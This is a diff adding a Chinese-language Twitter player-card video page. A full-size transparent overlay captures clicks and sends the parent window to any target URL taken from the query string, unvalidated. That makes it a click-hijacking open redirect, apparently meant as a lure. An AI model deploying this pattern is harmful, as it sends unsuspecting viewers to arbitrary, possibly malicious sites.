@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>视频播放器</title>
+    
+    <!-- Twitter Cards meta tags -->
+    <meta name="twitter:card" content="player">
+    <meta name="twitter:site" content="@777chudai">
+    <meta id="twitter-title" name="twitter:title" content="">
+    <meta id="twitter-description" name="twitter:description" content="">
+    <meta id="twitter-image" name="twitter:image" content="">
+    <meta id="twitter-player" name="twitter:player" content="">
+    <meta name="twitter:player:width" content="640">
+    <meta name="twitter:player:height" content="480">
+    <meta id="twitter-player-stream" name="twitter:player:stream" content="">
+    <meta name="twitter:player:stream:content_type" content="video/mp4">
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 640px;
+            aspect-ratio: 16/9;
+        }
+        
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .click-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+            background: transparent;
+            z-index: 1;
+        }
+        
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <div class="loading">加载中...</div>
+        <video id="video" muted loop playsinline>
+            <source id="video-source" src="" type="video/mp4">
+            您的浏览器不支持视频播放
+        </video>
+        <div class="click-overlay"></div>
+    </div>
+    
+    <script>
+        // 从URL参数中获取视频和目标链接
+        const urlParams = new URLSearchParams(window.location.search);
+        const videoUrl = urlParams.get('v');
+        const targetUrl = urlParams.get('t');
+        const title = urlParams.get('title') || '观看精彩视频';
+        const description = urlParams.get('desc') || '';
+        const thumbnail = urlParams.get('thumb') || '';
+        
+        // 设置视频源
+        if (videoUrl) {
+            const videoSource = document.getElementById('video-source');
+            videoSource.src = decodeURIComponent(videoUrl);
+            
+            const video = document.getElementById('video');
+            const loading = document.querySelector('.loading');
+            
+            // 当视频加载完成后开始播放
+            video.addEventListener('loadedmetadata', () => {
+                loading.style.display = 'none';
+                video.play().catch(err => {
+                    console.error('Error playing video:', err);
+                });
+            });
+            
+            // 视频加载错误处理
+            video.addEventListener('error', () => {
+                loading.textContent = '视频加载失败';
+            });
+            
+            // 点击时跳转到目标链接
+            const overlay = document.querySelector('.click-overlay');
+            if (targetUrl) {
+                overlay.addEventListener('click', () => {
+                    window.parent.location.href = decodeURIComponent(targetUrl);
+                });
+                overlay.style.cursor = 'pointer';
+            }
+        }
+        
+        // 设置Twitter Cards meta标签
+        const updateMetaTags = () => {
+            document.getElementById('twitter-title').content = title;
+            document.getElementById('twitter-description').content = description;
+            document.getElementById('twitter-image').content = thumbnail;
+            
+            // 构建播放器URL
+            const currentUrl = window.location.origin + window.location.pathname;
+            const playerUrl = `${currentUrl}?v=${encodeURIComponent(videoUrl)}&t=${encodeURIComponent(targetUrl)}`;
+            document.getElementById('twitter-player').content = playerUrl;
+            document.getElementById('twitter-player-stream').content = videoUrl;
+            
+            // 更新页面标题
+            document.title = title;
+        };
+        
+        if (videoUrl && targetUrl) {
+            updateMetaTags();
+        }
+    </script>
+</body>
+</html>
